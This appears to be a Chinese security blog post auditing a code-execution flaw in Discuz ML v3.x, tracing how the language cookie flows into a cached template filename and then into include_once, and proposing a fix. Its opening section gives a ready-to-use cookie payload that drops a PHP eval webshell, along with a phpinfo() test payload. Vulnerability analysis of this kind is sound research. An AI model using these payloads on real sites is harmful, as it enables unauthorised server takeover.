---
title: "Discuz Ml v3.x 代码执行分析"
date: 2019-07-11T20:48:12+08:00
draft: false
tags: ['exec','code']
categories: ['代码审计']
---
昨天晚上Discuz Ml爆出了漏洞，今天来分析一波。

<!--more-->

## exp

修改Cookie中的xxxx_language字段为以下内容即可

```php
%27.+file_put_contents%28%27shell.php%27%2Curldecode%28%27%253c%253fphp+%2520eval%28%2524_%2547%2545%2554%255b%2522a1%2522%255d%29%253b%253f%253e%27%29%29.%27
```

访问网站首页则会在根目录下生成木马文件,shell.php 密码为a1

![20190711205534.png](https://ae01.alicdn.com/kf/UTB8_Dhrw9bIXKJkSaef761asXXaa.png)

## 定位漏洞位置

解码exp

```
'.+file_put_contents('shell.php',urldecode('<?php+ eval($_GET["a1"]);?>')).'
```

修改exp为`_language=1.1.1;`使其报错。

![20190711210101.png](https://ae01.alicdn.com/kf/UTB8Hrllw__IXKJkSalU761BzVXat.png)

定位到653行

![20190711211456.png](https://ae01.alicdn.com/kf/UTB8TMXHw1vJXKJkSajh7637aFXaX.png)

关键代码644行
```php
$cachefile = './data/template/'.DISCUZ_LANG.'_'.(defined('STYLEID') ? STYLEID.'_' : '_').$templateid.'_'.str_replace('/', '_', $file).'.tpl.php';
```
`cachefile`变量是缓存文件，将其写入到`/data/template/`目录下，并且由`DISCUZ_LANG`拼接，追踪下`DISCUZ_LANG`的值
2088-2096行

```php
global $_G;
if($_G['config']['output']['language'] == 'zh_cn') {
return 'SC_UTF8';
} elseif ($_G['config']['output']['language'] == 'zh_tw') {
return 'TC_UTF8';
} else {
//vot !!!! ToDo: Check this for other languages !!!!!!!!!!!!!!!!!!!!!
/*vot*/			return strtoupper(DISCUZ_LANG) . '_UTF8';
}
```
可以看到`$_G['config']['output']['language']`作为`DISCUZ_LANG`的值

全局搜索`['language']`

source/class/discuz/discuz_application.php 305行，发现是从cookie中拿到language的值

![20190711212635.png](https://ae01.alicdn.com/kf/UTB86WNtw9bIXKJkSaef761asXXaB.png)

那么到这里整个漏洞的流程就很明显了，cookie中`language`参数可控导致`DISCUZ_LANG`可控，从而导致`cachefile`的文件名可被注入代码，最终`include_once`包含一下导致了造成代码执行。

phpinfo验证

`Ov1T_2132_language='.phpinfo().';`

![20190711214222.png](https://ae01.alicdn.com/kf/UTB8HphiwYnJXKJkSahG760hzFXaN.png)

## 修复建议

截止到本文发布之前，补丁还没有出来。

建议修改source/function/function_core.php 644行为

```php
/*vot*/	$cachefile = './data/template/'.'sc'.'_'.(defined('STYLEID') ? STYLEID.'_' : '_').$templateid.'_'.str_replace('/', '_', $file).'.tpl.php';
```
 删除可控变量

## 写在文后

其实从漏洞点的注释上来看就知道这是一个未完成的部分，毕竟还是`TODO`，开发人员得背锅。不过我怎么没有这种好运气呢，呜呜呜😭

